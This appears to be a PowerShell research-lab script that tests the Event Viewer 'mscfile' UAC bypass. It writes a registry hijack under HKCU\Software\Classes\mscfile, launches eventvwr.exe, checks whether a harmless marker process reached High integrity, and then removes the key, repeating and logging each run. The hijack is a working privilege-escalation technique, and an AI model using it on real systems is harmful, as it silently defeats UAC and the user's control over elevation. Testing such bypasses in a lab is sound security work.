# Event Viewer / mscfile UAC lab — registry hijack class (research lab only)
# Requires: admin on medium IL, UAC enabled. May be PATCHED on Win10+ — expect FAIL on modern builds.
param([int]$Runs = 3)
$ErrorActionPreference = 'Stop'
$TechniqueId = 'eventvwr-mscfile'
$here = $PSScriptRoot
$agentsRoot = 'C:\Users\Sniffer\.opencode\agents'
. (Join-Path $agentsRoot 'uac_msys64.ps1')

$evidence = Join-Path $here 'evidence'
New-Item -ItemType Directory -Force -Path $evidence | Out-Null

if (-not (Test-Path (Join-Path $here 'uac_lab_marker.exe'))) {
    if (-not (Test-UacMsys64)) { exit 1 }
    Build-UacLabMarker -OutDir $here | Out-Null
}
$marker = (Resolve-Path (Join-Path $here 'uac_lab_marker.exe')).Path

$regKey = 'HKCU:\Software\Classes\mscfile\shell\open\command'
$delegate = Join-Path $regKey 'DelegateExecute'

function Set-Hijack {
    param([string]$MarkerPath)
    New-Item -Path $regKey -Force | Out-Null
    Set-ItemProperty -Path $regKey -Name '(default)' -Value "`"$MarkerPath`"" -Force
    New-ItemProperty -Path $regKey -Name 'DelegateExecute' -Value '' -PropertyType String -Force | Out-Null
}

function Clear-Hijack {
    if (Test-Path $regKey) { Remove-Item -Recurse -Force $regKey -ErrorAction SilentlyContinue }
}

$ok = 0
for ($i = 1; $i -le $Runs; $i++) {
    Write-Host "=== Run $i / $Runs ===" -ForegroundColor Cyan
    Clear-Hijack
    Invoke-UacLabCapture -OutDir $evidence -Label "run${i}_before" | Out-Null
    Set-Hijack -MarkerPath $marker
    try {
        Start-Process -FilePath "$env:SystemRoot\System32\eventvwr.exe" -Wait -ErrorAction Stop
    } catch {
        $_ | Out-File (Join-Path $evidence "run${i}_eventvwr_err.txt")
    }
    Start-Sleep -Seconds 2
    $proof = Join-Path $env:TEMP 'uac_lab_proof.txt'
    if (Test-Path $proof) { Copy-Item -Force $proof (Join-Path $evidence "run${i}_proof.txt") }
    $cap = Invoke-UacLabCapture -OutDir $evidence -Label "run${i}_after"
    Clear-Hijack
    if ($cap -match 'MandatoryLabel=.*High') { $ok++ }
}
Write-Host "Passed: $ok / $Runs"
exit $(if ($ok -eq $Runs) { 0 } else { 1 })
